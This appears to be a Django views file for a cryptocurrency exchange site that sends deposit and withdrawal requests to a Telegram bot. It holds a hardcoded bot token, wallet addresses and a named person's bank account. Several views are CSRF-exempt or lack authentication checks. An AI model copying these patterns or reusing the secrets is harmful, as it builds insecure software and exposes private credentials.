from datetime import timezone
from lib2to3.fixes.fix_input import context
from pyexpat.errors import messages
from django.conf import settings
from django.shortcuts import render,redirect,get_object_or_404

# Create your views here.
# views.py
from .models import CryptoCurrency,CryptoTransaction
from django.contrib.auth.decorators import login_required
from django.contrib.auth.forms import AuthenticationForm, UserCreationForm
from django.contrib.auth import authenticate, login as auth_login
from.forms import UserLoginForm,UserRegistrationForm
from django.views.decorators.csrf import csrf_exempt
from django.http import HttpResponse, HttpResponseNotAllowed,Http404
import requests
import json
from .forms import DepositForm
from .models import Profile, CryptoBalance, Transaction, Notification
from django.contrib.auth.tokens import default_token_generator
from django.contrib.sites.shortcuts import get_current_site
from django.core.mail import send_mail
from django.template.loader import render_to_string
from django.utils.http import urlsafe_base64_encode
from django.utils.encoding import force_bytes
from django.contrib.auth.forms import PasswordResetForm
from django.urls import reverse
from django.contrib.auth.models import User
from django.contrib.auth.forms import SetPasswordForm
from django.utils.http import urlsafe_base64_decode
from django.utils.encoding import force_str
from django.http import JsonResponse
from django.contrib import messages
from .models import CryptoTransaction
from django.utils import timezone
from requests.exceptions import RequestException
from django.views.decorators.csrf import csrf_exempt
from django.core.mail import EmailMessage
'''
@login_required
def profile(request):
    # Get the current user's profile
    profile = request.user.profile
    
    # Filter CryptoBalance objects based on the current user's profile
    crypto_balances = CryptoBalance.objects.filter(profile=profile)
    
    # Combine the context data into a single dictionary
    context = {
        'username': request.user.username,
        'crypto_balances': crypto_balances,
    }
    
    return render(request, 'profile.html', context)
'''

@login_required
def profile(request):
    # Ensure the profile exists or create it if it doesn't
    profile, created = Profile.objects.get_or_create(user=request.user)
    
    # Filter CryptoBalance objects based on the current user's profile
    crypto_balances = CryptoBalance.objects.filter(profile=profile)
    
    # Calculate the total value of all cryptocurrencies
    total_value = sum(balance.value for balance in crypto_balances)
     # Get the user's transactions
    transactions = Transaction.objects.filter(user=request.user).order_by('-date')

    # Get the user's notifications
    notifications = Notification.objects.filter(user=request.user).order_by('-created_at')
    # Combine the context data into a single dictionary
    context = {
        'username': request.user.username,
        'crypto_balances': crypto_balances,
        'total_value': total_value,
        'transactions': transactions,
        'notifications': notifications,
    }
    
    return render(request, 'profile.html', context)



def index(request):
    return render(request, 'index.html')
'''
def signup(request):
    if request.method == 'POST':
        form = UserCreationForm(request.POST)
        if form.is_valid():
            form.save()
            username = form.cleaned_data.get('username')
            password = form.cleaned_data.get('password1')
            user = authenticate(username=username, password=password)
            auth_login(request, user)
            return redirect('login')
    else:
        form = UserCreationForm()
    return render(request, 'registration/register.html', {'form': form})
'''
def signup(request):
    if request.method == 'POST':
        form = UserRegistrationForm(request.POST)
        if form.is_valid():
            form.save()
            username = form.cleaned_data.get('username')
            password = form.cleaned_data.get('password1')
            user = authenticate(username=username, password=password)
            if user is not None:
                auth_login(request, user)
                return redirect('profile')  # Redirect to profile after successful login
            else:
                return redirect('login')
    else:
        form = UserRegistrationForm()
    return render(request, 'registration/register.html', {'form': form})
#def deposit(request):
    #return render(request,'deposit.html')

@csrf_exempt
def deposit(request):
    profile = request.user.profile
    if request.method == 'POST':
        form = DepositForm(request.POST)
        if form.is_valid():
            username = form.cleaned_data['username']
            cryptocurrency = form.cleaned_data['cryptocurrency']
            
            # Check if the user exists in the database
            try:
                # Query the user profile based on the username
                user_profile = get_object_or_404(Profile, user__username=username)
            except Http404:
                return HttpResponse("User does not exist! Therefore Check your username ❤️❤️")
            
            # Fetch the corresponding cryptocurrency address
            addresses = {
                'btc': 'bc1qulpk52jwy6kdrhmy98ca2w74r6mt8ghz66f9m5',
                'eth': '0x819cb170Fa8e8d07251de02a4045422DD04B52fe',
                'ltc': 'ltc1q9hdl7n2mm6qx2s4wumdhckwwpmkp3nh5s55k8z',
                'doge': 'DL3y2RRARQJeKUWgEty9X1DeC6EZ7MXKNu',
                'sol': '4x84ag5erjxM48CgggQKpe9mPyafR9bUK92HQkSB3yFq',
                'bnb': '0x819cb170Fa8e8d07251de02a4045422DD04B52fe',
                'ton': 'UQBA4eo0m34MHuLwRrB9ja4IOGqsRFFr6xEZ79xEcjlk-ORA',
                'bch': 'qrjr5x8y936wa3yp9decz2us0wm09f004sckj8t4yj',
                'tron':'TS8w53HTn2rwNREkT8VWZsfoyJPLfkUa42'

            }
            address = addresses.get(cryptocurrency, 'Unknown')

            # Prepare message to send to Telegram bot
            message = f"New deposit request:\nUsername: {username}\nCryptocurrency: {cryptocurrency}\nAddress: {address}"

            # Send message to Telegram bot
            bot_token = '6671002478:AAFE7kL6WfykJFWeGP9Z1hd2o7APL7vkomw'
            chat_id = '1666996815'
            url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
            payload = {
                'chat_id': chat_id,
                'text': message
            }
            response = requests.post(url, json=payload)
       
       
            # Check if message sent successfully
            if response.ok:
                return HttpResponse("Deposit request sent successfully!")
            else:
                return HttpResponse("Failed to send deposit request to Telegram bot.")
        else:
            return HttpResponse("Form is invalid!")
    else:
        form = DepositForm()
    context = {
        'form': form,
        'username': request.user.username,
    }
    return render(request, 'payments/deposit.html', context)


def withdraw(request):
    if request.method == 'POST':
        # Get form data
        username = request.POST.get('username')
        cryptocurrency = request.POST.get('cryptocurrency')
        crypto_address = request.POST.get('crypto_address')
        amount = request.POST.get('amount')
        try:
                # Query the user profile based on the username
            user_profile = get_object_or_404(Profile, user__username=username)
        except Http404:
                return HttpResponse("User does not exist! Therefore Check your username ❤️❤️")
        # Construct message to send to Telegram bot
        message = f"New withdrawal request:\nUsername: {username}\nCryptocurrency: {cryptocurrency}\nAddress: {crypto_address}\nAmount: {amount}"

        # Send message to Telegram bot
        bot_token = '6671002478:AAFE7kL6WfykJFWeGP9Z1hd2o7APL7vkomw'
        chat_id = '1666996815'
        url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
        payload = {
            'chat_id': chat_id,
            'text': message
        }
        response = requests.post(url, json=payload)

        # Check if message sent successfully
        if response.ok:
            return HttpResponse("Withdrawal request sent successfully! processing withdrawal")
        else:
            return HttpResponse("Failed to send withdrawal request to Telegram bot.")
    context = {
        'username': request.user.username,
    }
    return render(request, 'payments/withdraw.html',context)  # Replace 'withdraw.html' with your template file
# Define a dictionary to hold cryptocurrency withdrawal fees
withdrawal_fees = {
    'btc': 0.00025,  # BTC withdrawal fee
    'eth': 0.003,  # ETH withdrawal fee
    'ltc': 0.001,   # LTC withdrawal fee
    'doge': 2,     # DOGE withdrawal fee (for example, 1 DOGE)
    'sol': 0.001,     # SOL withdrawal fee
    'bnb smartchain': 0.0009,
    'tron': 5
}

@csrf_exempt
def receive(request):
    profile = request.user.profile
    if request.method == 'POST':
        form = DepositForm(request.POST)
        if form.is_valid():
            username = form.cleaned_data['username']
            cryptocurrency = form.cleaned_data['cryptocurrency']
            
            # Check if the user exists in the database
            try:
                # Query the user profile based on the username
                user_profile = get_object_or_404(Profile, user__username=username)
            except Http404:
                return HttpResponse("User does not exist! Therefore Check your username ❤️❤️")
            
            # Fetch the corresponding cryptocurrency address
            addresses = {
                'btc': 'bc1qulpk52jwy6kdrhmy98ca2w74r6mt8ghz66f9m5',
                'eth': '0x819cb170Fa8e8d07251de02a4045422DD04B52fe',
                'ltc': 'ltc1q9hdl7n2mm6qx2s4wumdhckwwpmkp3nh5s55k8z',
                'doge': 'DL3y2RRARQJeKUWgEty9X1DeC6EZ7MXKNu',
                'sol': '4x84ag5erjxM48CgggQKpe9mPyafR9bUK92HQkSB3yFq',
                'bnb smartchain': '0x819cb170Fa8e8d07251de02a4045422DD04B52fe',
                'ton': 'UQBA4eo0m34MHuLwRrB9ja4IOGqsRFFr6xEZ79xEcjlk-ORA',
                'bch': 'qrjr5x8y936wa3yp9decz2us0wm09f004sckj8t4yj',
                'tron':'TS8w53HTn2rwNREkT8VWZsfoyJPLfkUa42'
            }
            address = addresses.get(cryptocurrency, 'Unknown')

            # Prepare message to send to Telegram bot
            message = f"New received :\nUsername: {username}\nCryptocurrency: {cryptocurrency}\nAddress: {address}"

            # Send message to Telegram bot
            bot_token = '6671002478:AAFE7kL6WfykJFWeGP9Z1hd2o7APL7vkomw'
            chat_id = '1666996815'
            url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
            payload = {
                'chat_id': chat_id,
                'text': message
            }
            response = requests.post(url, json=payload)
       
       
            # Check if message sent successfully
            if response.ok:
                return HttpResponse("received successfully!your crypto is pending")
            else:
                return HttpResponse("Failed to send deposit request to Telegram bot.")
        else:
            return HttpResponse("Form is invalid!")
    else:
        form = DepositForm()
    context = {
        'form': form,
        'username': request.user.username,
    }
    return render(request, 'payments/receive.html', context)
def password_reset_request(request):
    if request.method == "POST":
        password_reset_form = PasswordResetForm(request.POST)
        if password_reset_form.is_valid():
            data = password_reset_form.cleaned_data['email']
            associated_users = User.objects.filter(email=data)
            if associated_users.exists():
                for user in associated_users:
                    subject = "Password Reset Requested"
                    email_template_name = "password-reset/password_reset_email.txt"
                    context = {
                        "email": user.email,
                        "domain": get_current_site(request).domain,
                        "site_name": "cryptify",
                        "uid": urlsafe_base64_encode(force_bytes(user.pk)),
                        "user": user,
                        "token": default_token_generator.make_token(user),
                        "protocol": 'http',
                    }
                    email = render_to_string(email_template_name, context)
                    try:
                        send_mail(subject, email, 'admin@mywebsite.com', [user.email], fail_silently=False)
                    except:
                        return HttpResponse("Invalid header found.")
            return redirect("password_reset_done")
    password_reset_form = PasswordResetForm()
    return render(request=request, template_name="password-reset/password_reset_form.html", context={"password_reset_form": password_reset_form})

def password_reset_confirm(request, uidb64=None, token=None):
    try:
        uid = force_str(urlsafe_base64_decode(uidb64))
        user = User.objects.get(pk=uid)
    except (TypeError, ValueError, OverflowError, User.DoesNotExist):
        user = None

    if user is not None and default_token_generator.check_token(user, token):
        if request.method == "POST":
            form = SetPasswordForm(user, request.POST)
            if form.is_valid():
                form.save()
                return redirect("password_reset_complete")
        else:
            form = SetPasswordForm(user)
    else:
        form = None
    return render(request, "password-reset/password_reset_confirm.html", {"form": form})


def buy_crypto(request):
    profile = request.user.profile
    if request.method == 'POST':
        amount_naira = request.POST.get('amount_naira')
        cryptocurrency = request.POST.get('cryptocurrency')

        try:
            # Use CoinGecko API to get exchange rates
            response = requests.get('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,litecoin,solana,tron,bitcoin-cash&vs_currencies=ngn')
            response.raise_for_status()  # Raise an HTTPError for bad responses
            rates = response.json()
            crypto_prices = {
                'btc': rates['bitcoin']['ngn'],
                'eth': rates['ethereum']['ngn'],
                'ltc': rates['litecoin']['ngn'],
                'sol': rates['solana']['ngn'],
                'bch': rates['bitcoin-cash']['ngn'],
                'tron': rates['tron']['ngn'],
            }

            crypto_price = crypto_prices.get(cryptocurrency)
            if not crypto_price:
                messages.error(request, 'Invalid cryptocurrency selected.')
                return redirect('buy_crypto')

            crypto_amount = float(amount_naira) / crypto_price
            crypto_amount = round(crypto_amount, 8)
            crypto_name = cryptocurrency.upper()

            request.session['conversion'] = {
                'amount_naira': amount_naira,
                'crypto_amount': crypto_amount,
                'crypto_name': crypto_name
            }

            return redirect('preview_conversion')
        
        except RequestException as e:
            messages.error(request, 'Failed to retrieve cryptocurrency prices. Please try again later.')
            return redirect('buy_crypto')
    context = {
        'username': request.user.username,
    }
    return render(request, 'buy/buy_crypto.html',context)


# views.py
def preview_conversion(request):
    profile = request.user.profile
    conversion = request.session.get('conversion')

    if not conversion:
        return redirect('buy_crypto')

    if request.method == 'POST':
        # Create a transaction record
        transaction = CryptoTransaction.objects.create(
            user=request.user,
            amount_naira=conversion['amount_naira'],
            crypto_amount=conversion['crypto_amount'],
            cryptocurrency=conversion['crypto_name'].lower()
        )
        request.session['transaction_id'] = transaction.id
        return redirect('p2p_page')

    context = {
        'username': request.user.username,
        'amount_naira': conversion['amount_naira'],
        'crypto_amount': conversion['crypto_amount'],
        'crypto_name': conversion['crypto_name']
    }
    return render(request, 'buy/preview_conversion.html', context)

def cryptify(request):
    return render(request, 'cryptify.html')


def p2p_page(request):
    profile = request.GET.get('profile')
    transaction_id = request.session.get('transaction_id')
    if not transaction_id:
        return redirect('buy_crypto')

    transaction = CryptoTransaction.objects.get(id=transaction_id, user=request.user)

    if request.method == 'POST':
        if 'cancel_trade' in request.POST:
            transaction.status = 'cancelled'
            transaction.save()
            messages.success(request, 'Trade has been cancelled.')
            send_mail(
                'P2P Trade Cancelled',
                'Your P2P trade has been cancelled due to time expiration.',
                'from@example.com',
                [request.user.email],
                fail_silently=False,
            )
            return redirect('buy_crypto')
        
        if 'remind_seller' in request.POST:
            send_mail(
                'P2P Trade Reminder',
                'The buyer has reminded you to check the payment.',
                'from@example.com',
                ['cryptify.online@gmail.com'],
                fail_silently=False,
            )
            messages.success(request, 'Reminder sent to the seller.')

        if 'confirm_payment' in request.POST:
            transaction.status = 'payment_confirmed'
            transaction.save()
            messages.success(request, 'Payment confirmed. Awaiting seller confirmation.')

            # Notify buyer of trade completion
            send_mail(
                'Trade Completed',
                'Your trade has been completed. Your coins will be arriving soon.',
                'from@example.com',
                [request.user.email],
                fail_silently=False,
            )

        if 'upload_image' in request.POST and request.FILES.get('transaction_image'):
            transaction.transaction_image = request.FILES['transaction_image']
            transaction.save()

            # Send email with attachment
            email = EmailMessage(
                'P2P Trade Payment Image Uploaded',
                'The buyer has uploaded the transaction image for your reference.',
                'from@example.com',
                ['cryptify.online@gmail.com']
            )
            email.attach(transaction.transaction_image.name, transaction.transaction_image.read())
            email.send()

            messages.success(request, 'Transaction image uploaded and sent to the seller.')

    seller_info = {
        'name': 'Abandy Cherish',
        'account_number': '6099165613',
        'bank': '9 payment service bank',
    }

    context = {
        'transaction': transaction,
        'seller_info': seller_info,
        'deadline': (timezone.now() + timezone.timedelta(minutes=15)).timestamp(),
        'username': request.user.username,
    }

    return render(request, 'buy/p2p_page.html', context)
@csrf_exempt
def cancel_trade(request):
    if request.method == 'POST':
        transaction_id = request.session.get('transaction_id')
        transaction = CryptoTransaction.objects.get(id=transaction_id, user=request.user)
        transaction.status = 'cancelled'
        transaction.save()
        send_mail(
            'P2P Trade Cancelled',
            'Your P2P trade has been cancelled.',
            settings.DEFAULT_FROM_EMAIL,
            [request.user.email],
            fail_silently=False,
        )
        return JsonResponse({'success': True})
    return JsonResponse({'success': False})
